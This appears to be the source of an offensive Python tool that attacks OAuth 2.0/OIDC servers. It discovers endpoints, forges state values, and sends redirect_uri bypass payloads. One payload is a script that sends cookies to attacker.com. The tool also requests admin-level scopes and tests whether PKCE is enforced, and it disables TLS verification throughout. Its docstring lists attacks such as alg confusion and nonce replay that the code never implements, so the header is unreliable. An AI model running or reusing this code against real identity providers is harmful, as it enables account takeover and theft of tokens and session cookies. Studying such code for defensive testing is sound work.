"""
oauth_attack.py
===============
OAuth 2.0 / OIDC Attack Suite:
  - State parameter fixation / CSRF
  - redirect_uri bypass (open redirect, subdomain takeover, path traversal)
  - Implicit flow token leakage (Referer header, fragment persistence)
  - Authorization code interception
  - PKCE downgrade attack
  - Token leakage via Referer header
  - nonce replay / missing nonce
  - scope escalation (request more scopes than granted)
  - id_token algorithm confusion (OIDC alg:none, RS256→HS256)
  - Client credentials exposure detection
  - Token endpoint enumeration
  - Well-known OIDC config harvesting
"""

from __future__ import annotations

import hashlib
import json
import re
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple


# ---------------------------------------------------------------------------
# HTTP helper
# ---------------------------------------------------------------------------

def _get(url: str, headers: Optional[Dict] = None, timeout: float = 10.0,
         follow_redirects: bool = False) -> Tuple[int, str, Dict]:
    try:
        req = urllib.request.Request(url)
        req.add_header("User-Agent", "Mozilla/5.0 PhantomRecon/1.0")
        if headers:
            for k, v in headers.items():
                req.add_header(k, v)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
        if not follow_redirects:
            class NoRedir(urllib.request.HTTPRedirectHandler):
                def redirect_request(self, *a, **kw): return None
            opener.add_handler(NoRedir())
        with opener.open(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", errors="replace"), dict(r.headers)
    except urllib.error.HTTPError as e:
        return e.code, "", dict(e.headers) if e.headers else {}
    except Exception as e:
        return 0, str(e), {}

def _post(url: str, data: Dict, headers: Optional[Dict] = None, timeout: float = 10.0) -> Tuple[int, str, Dict]:
    try:
        body = urllib.parse.urlencode(data).encode()
        req  = urllib.request.Request(url, data=body, method="POST")
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
        req.add_header("User-Agent", "Mozilla/5.0 PhantomRecon/1.0")
        if headers:
            for k, v in headers.items():
                req.add_header(k, v)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return r.status, r.read().decode("utf-8", errors="replace"), dict(r.headers)
    except urllib.error.HTTPError as e:
        try:
            body_r = e.read().decode("utf-8", errors="replace")
        except Exception:
            body_r = ""
        return e.code, body_r, {}
    except Exception as e:
        return 0, str(e), {}


# ---------------------------------------------------------------------------
# Data classes
# ---------------------------------------------------------------------------

@dataclass
class OAuthConfig:
    authorization_endpoint: Optional[str] = None
    token_endpoint:         Optional[str] = None
    userinfo_endpoint:      Optional[str] = None
    jwks_uri:               Optional[str] = None
    issuer:                 Optional[str] = None
    response_types:         List[str]     = field(default_factory=list)
    grant_types:            List[str]     = field(default_factory=list)
    scopes:                 List[str]     = field(default_factory=list)
    pkce_supported:         bool          = False
    raw:                    Dict          = field(default_factory=dict)

@dataclass
class OAuthFinding:
    attack:   str
    severity: str
    title:    str
    evidence: str
    payload:  Optional[str] = None
    details:  Dict          = field(default_factory=dict)


# ---------------------------------------------------------------------------
# OIDC Discovery
# ---------------------------------------------------------------------------

WELL_KNOWN_PATHS = [
    "/.well-known/openid-configuration",
    "/.well-known/oauth-authorization-server",
    "/oauth/.well-known/openid-configuration",
    "/auth/.well-known/openid-configuration",
    "/realms/master/.well-known/openid-configuration",
    "/.well-known/jwks.json",
    "/oauth/token",
    "/oauth2/token",
    "/connect/token",
    "/auth/token",
]


class OIDCDiscovery:
    def discover(self, base_url: str) -> Tuple[Optional[OAuthConfig], List[str]]:
        base_url = base_url.rstrip("/")
        endpoints_found = []

        for path in WELL_KNOWN_PATHS:
            code, body, _ = _get(base_url + path)
            if code == 200 and body:
                try:
                    data = json.loads(body)
                    cfg  = OAuthConfig(
                        authorization_endpoint=data.get("authorization_endpoint"),
                        token_endpoint=data.get("token_endpoint"),
                        userinfo_endpoint=data.get("userinfo_endpoint"),
                        jwks_uri=data.get("jwks_uri"),
                        issuer=data.get("issuer"),
                        response_types=data.get("response_types_supported", []),
                        grant_types=data.get("grant_types_supported", []),
                        scopes=data.get("scopes_supported", []),
                        pkce_supported="S256" in data.get("code_challenge_methods_supported", []),
                        raw=data,
                    )
                    return cfg, endpoints_found
                except Exception:
                    endpoints_found.append(base_url + path)

        return None, endpoints_found


# ---------------------------------------------------------------------------
# Attack 1: State fixation / CSRF
# ---------------------------------------------------------------------------

class StateFixationAttack:
    def check_missing_state(self, auth_url: str) -> Optional[OAuthFinding]:
        parsed = urllib.parse.urlparse(auth_url)
        params = urllib.parse.parse_qs(parsed.query)
        if "state" not in params:
            return OAuthFinding(
                attack="state_csrf",
                severity="high",
                title="OAuth CSRF — Missing state parameter",
                evidence=f"Authorization URL missing 'state': {auth_url}",
                payload=auth_url,
            )
        return None

    def check_predictable_state(self, auth_url: str) -> Optional[OAuthFinding]:
        parsed = urllib.parse.urlparse(auth_url)
        params = urllib.parse.parse_qs(parsed.query)
        state  = params.get("state", [""])[0]
        if len(state) < 8:
            return OAuthFinding(
                attack="state_predictable",
                severity="medium",
                title="OAuth CSRF — State parameter too short/predictable",
                evidence=f"state={state!r} (length {len(state)} < 8)",
            )
        if state.isdigit() or state in ("0", "1", "csrf", "state", "token", "nonce"):
            return OAuthFinding(
                attack="state_predictable",
                severity="medium",
                title="OAuth CSRF — State parameter appears predictable",
                evidence=f"Predictable state value: {state!r}",
            )
        return None

    def forge_request(self, auth_url: str, fixed_state: str = "phantom_fixed_state_12345") -> str:
        parsed = urllib.parse.urlparse(auth_url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        params["state"] = [fixed_state]
        new_query = urllib.parse.urlencode(params, doseq=True)
        return parsed._replace(query=new_query).geturl()


# ---------------------------------------------------------------------------
# Attack 2: redirect_uri bypass
# ---------------------------------------------------------------------------

REDIRECT_URI_BYPASS_PATTERNS = [
    "{legit}@attacker.com",
    "attacker.com/{legit}",
    "{legit}.attacker.com",
    "{legit}%2F@attacker.com",
    "{legit}?redirect=attacker.com",
    "{legit}/../../../attacker.com",
    "https://attacker.com/{legit}",
    "https://{legit}.attacker.com",
    "https://{legit}%252F@attacker.com",
    "https://attacker.com#@{legit}",
    "https://{legit}:@attacker.com",
    "javascript:alert(1)//{legit}",
    "data:text/html,<script>document.location='https://attacker.com?c='+document.cookie</script>",
]


class RedirectURIAttack:
    def generate_bypass_uris(self, legitimate_uri: str) -> List[str]:
        parsed   = urllib.parse.urlparse(legitimate_uri)
        hostname = parsed.netloc
        payloads = []
        for pattern in REDIRECT_URI_BYPASS_PATTERNS:
            payloads.append(pattern.replace("{legit}", hostname))
        return payloads

    def test_bypass(self, auth_endpoint: str, client_id: str,
                    legitimate_redirect: str, scope: str = "openid profile") -> List[OAuthFinding]:
        findings = []
        bypass_uris = self.generate_bypass_uris(legitimate_redirect)

        for uri in bypass_uris:
            params = {
                "response_type": "code",
                "client_id": client_id,
                "redirect_uri": uri,
                "scope": scope,
                "state": "phantom_csrf_test",
            }
            test_url = auth_endpoint + "?" + urllib.parse.urlencode(params)
            code, body, headers = _get(test_url, follow_redirects=False)
            location  = headers.get("Location", headers.get("location", ""))
            if "error" not in location.lower() and "invalid" not in body.lower():
                if code in (301, 302, 303, 307, 308) or "attacker.com" in location:
                    findings.append(OAuthFinding(
                        attack="redirect_uri_bypass",
                        severity="critical",
                        title="OAuth redirect_uri bypass",
                        evidence=f"Server accepted bypass URI: {uri!r} → Location: {location}",
                        payload=test_url,
                        details={"bypass_uri": uri, "status": code},
                    ))
        return findings


# ---------------------------------------------------------------------------
# Attack 3: Implicit flow token leakage
# ---------------------------------------------------------------------------

class ImplicitFlowAttack:
    def check_implicit_enabled(self, cfg: OAuthConfig) -> Optional[OAuthFinding]:
        if "implicit" in cfg.grant_types or "token" in cfg.response_types:
            return OAuthFinding(
                attack="implicit_flow_enabled",
                severity="medium",
                title="OAuth implicit flow enabled",
                evidence=f"Implicit grant detected — tokens exposed in URL fragment (Referer leakage risk)",
                details={"response_types": cfg.response_types, "grant_types": cfg.grant_types},
            )
        return None

    def generate_implicit_url(self, auth_endpoint: str, client_id: str,
                               redirect_uri: str, scope: str = "openid") -> str:
        params = {
            "response_type": "token id_token",
            "client_id":     client_id,
            "redirect_uri":  redirect_uri,
            "scope":         scope,
            "nonce":         "phantom_nonce_test",
        }
        return auth_endpoint + "?" + urllib.parse.urlencode(params)


# ---------------------------------------------------------------------------
# Attack 4: PKCE downgrade
# ---------------------------------------------------------------------------

class PKCEDowngradeAttack:
    def check_pkce_required(self, auth_endpoint: str, client_id: str,
                              redirect_uri: str) -> Optional[OAuthFinding]:
        params = {
            "response_type": "code",
            "client_id":     client_id,
            "redirect_uri":  redirect_uri,
            "scope":         "openid",
            "state":         "pkce_test",
        }
        url  = auth_endpoint + "?" + urllib.parse.urlencode(params)
        code, body, headers = _get(url, follow_redirects=False)
        location = headers.get("Location", headers.get("location", ""))

        if code in (301, 302) and "code=" in location and "error" not in location:
            return OAuthFinding(
                attack="pkce_not_enforced",
                severity="high",
                title="PKCE not enforced — authorization code interception possible",
                evidence=f"Server issued code without PKCE challenge: {location[:100]}",
                payload=url,
            )
        return None

    def generate_pkce_verifier(self) -> Tuple[str, str]:
        import random, string
        verifier  = "".join(random.choices(string.ascii_letters + string.digits + "-._~", k=64))
        challenge = hashlib.sha256(verifier.encode()).digest()
        import base64
        challenge_b64 = base64.urlsafe_b64encode(challenge).rstrip(b"=").decode()
        return verifier, challenge_b64


# ---------------------------------------------------------------------------
# Attack 5: Scope escalation
# ---------------------------------------------------------------------------

ESCALATION_SCOPES = [
    "admin", "superuser", "root", "write", "delete", "execute",
    "read:all", "write:all", "admin:*", "openid profile email",
    "openid profile email address phone offline_access",
    "urn:iam::policy/AdministratorAccess",
    "https://www.googleapis.com/auth/admin",
    "https://graph.microsoft.com/.default",
    "api:full_access", "user:admin", "repo:full",
]


class ScopeEscalationAttack:
    def test_scope_escalation(self, auth_endpoint: str, client_id: str,
                               redirect_uri: str, granted_scope: str) -> List[OAuthFinding]:
        findings = []
        for scope in ESCALATION_SCOPES:
            if scope == granted_scope:
                continue
            params = {
                "response_type": "code",
                "client_id":     client_id,
                "redirect_uri":  redirect_uri,
                "scope":         scope,
                "state":         "scope_test",
            }
            url  = auth_endpoint + "?" + urllib.parse.urlencode(params)
            code, body, headers = _get(url, follow_redirects=False)
            location = headers.get("Location", headers.get("location", ""))
            if code in (301, 302) and "code=" in location and "error" not in location:
                findings.append(OAuthFinding(
                    attack="scope_escalation",
                    severity="high",
                    title=f"OAuth scope escalation — server granted: {scope!r}",
                    evidence=f"Requested escalated scope {scope!r} was accepted",
                    payload=url,
                    details={"requested_scope": scope, "location": location[:100]},
                ))
        return findings


# ---------------------------------------------------------------------------
# Master OAuth Attacker
# ---------------------------------------------------------------------------

class OAuthAttacker:
    def __init__(self):
        self.discovery   = OIDCDiscovery()
        self.state       = StateFixationAttack()
        self.redirect    = RedirectURIAttack()
        self.implicit    = ImplicitFlowAttack()
        self.pkce        = PKCEDowngradeAttack()
        self.scope       = ScopeEscalationAttack()

    def full_attack(self, base_url: str, client_id: Optional[str] = None,
                    redirect_uri: Optional[str] = None) -> Dict:
        results: Dict = {"base_url": base_url, "config": None, "findings": []}

        cfg, endpoints = self.discovery.discover(base_url)
        if cfg:
            results["config"] = {
                "authorization_endpoint": cfg.authorization_endpoint,
                "token_endpoint":         cfg.token_endpoint,
                "jwks_uri":               cfg.jwks_uri,
                "issuer":                 cfg.issuer,
                "response_types":         cfg.response_types,
                "grant_types":            cfg.grant_types,
                "pkce_supported":         cfg.pkce_supported,
            }
            f = self.implicit.check_implicit_enabled(cfg)
            if f:
                results["findings"].append(f.__dict__)

        if cfg and cfg.authorization_endpoint and client_id and redirect_uri:
            auth_ep = cfg.authorization_endpoint
            f = self.state.check_missing_state(
                auth_ep + f"?response_type=code&client_id={client_id}&redirect_uri={redirect_uri}"
            )
            if f:
                results["findings"].append(f.__dict__)

            for finding in self.redirect.test_bypass(auth_ep, client_id, redirect_uri):
                results["findings"].append(finding.__dict__)

            f = self.pkce.check_pkce_required(auth_ep, client_id, redirect_uri)
            if f:
                results["findings"].append(f.__dict__)

        return results
